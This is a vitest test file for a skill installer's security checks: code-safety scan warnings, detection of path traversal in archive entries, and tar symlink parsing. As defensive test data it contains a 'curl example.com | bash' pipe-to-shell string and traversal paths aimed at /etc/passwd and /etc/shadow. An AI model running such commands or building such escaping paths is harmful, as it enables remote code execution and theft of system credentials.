import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { entryEscapesTarget, installSkill, parseTarSymlinkTarget } from "./skills-install.js";

const runCommandWithTimeoutMock = vi.fn();
const scanDirectoryWithSummaryMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  it("adds detailed warnings for critical findings and continues install", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'dangerous("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("warns and continues when skill scan fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
        true,
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});

describe("entryEscapesTarget", () => {
  const target = "/tmp/install-root";

  it("allows normal relative paths", () => {
    expect(entryEscapesTarget("bin/signal-cli", target)).toBe(false);
    expect(entryEscapesTarget("lib/signal.jar", target)).toBe(false);
    expect(entryEscapesTarget("README.md", target)).toBe(false);
  });

  it("allows nested directories", () => {
    expect(entryEscapesTarget("signal-cli-0.13/bin/signal-cli", target)).toBe(false);
    expect(entryEscapesTarget("a/b/c/d.txt", target)).toBe(false);
  });

  it("allows trailing slash (directory entry)", () => {
    expect(entryEscapesTarget("bin/", target)).toBe(false);
    expect(entryEscapesTarget("lib/ext/", target)).toBe(false);
  });

  it("rejects path traversal with ../", () => {
    expect(entryEscapesTarget("../etc/passwd", target)).toBe(true);
    expect(entryEscapesTarget("foo/../../etc/shadow", target)).toBe(true);
    expect(entryEscapesTarget("../../../tmp/evil", target)).toBe(true);
  });

  it("rejects absolute paths", () => {
    expect(entryEscapesTarget("/etc/passwd", target)).toBe(true);
    expect(entryEscapesTarget("/tmp/other/file", target)).toBe(true);
  });

  it("rejects backslash-separated traversal paths (normalized to /)", () => {
    expect(entryEscapesTarget("..\\etc\\passwd", target)).toBe(true);
    expect(entryEscapesTarget("foo\\..\\..\\etc\\shadow", target)).toBe(true);
  });

  it("allows entry that resolves exactly to targetDir", () => {
    expect(entryEscapesTarget(".", target)).toBe(false);
    expect(entryEscapesTarget("./", target)).toBe(false);
  });
});

describe("parseTarSymlinkTarget", () => {
  it("returns undefined for regular files", () => {
    expect(
      parseTarSymlinkTarget("-rw-r--r--  0 user group  1234 2026-01-01 00:00 file.txt"),
    ).toBeUndefined();
  });

  it("returns undefined for directories", () => {
    expect(
      parseTarSymlinkTarget("drwxr-xr-x  0 user group     0 2026-01-01 00:00 dir/"),
    ).toBeUndefined();
  });

  it("extracts symlink target from tar tvf line", () => {
    expect(
      parseTarSymlinkTarget("lrwxr-xr-x  0 user group     0 2026-01-01 00:00 ./evil-link -> /etc"),
    ).toBe("/etc");
  });

  it("extracts relative symlink targets", () => {
    expect(
      parseTarSymlinkTarget(
        "lrwxr-xr-x  0 user group     0 2026-01-01 00:00 ./link -> ../../../etc",
      ),
    ).toBe("../../../etc");
  });

  it("handles symlink to local path (safe)", () => {
    expect(
      parseTarSymlinkTarget(
        "lrwxr-xr-x  0 user group     0 2026-01-01 00:00 ./bin/cli -> ./lib/main",
      ),
    ).toBe("./lib/main");
  });
});
